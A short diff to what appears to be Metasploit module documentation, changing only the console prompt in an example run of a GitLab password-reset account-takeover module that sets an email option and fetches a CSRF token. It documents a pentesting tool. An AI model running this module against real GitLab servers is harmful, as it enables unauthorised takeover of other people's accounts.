@@ -56,7 +56,7 @@ resource (gitlab)> set myemail my_email@example.com
 myemail => my_email@example.com
 resource (gitlab)> set verbose true
 verbose => true
-msf6 auxiliary(scanner/admin/gitlab_password_reset_account_takeover) > exploit
+msf auxiliary(scanner/admin/gitlab_password_reset_account_takeover) > exploit
 
 [*] Obtaining CSRF token
 [+] CSRF Token: URTwtcW7cTgXEoFoa0To9jTXCubxXpJwcCiLjXbrAIFeO5TJza9x-amxcWGmX2oC8SppWeTIIWUG19WCvW_2ig
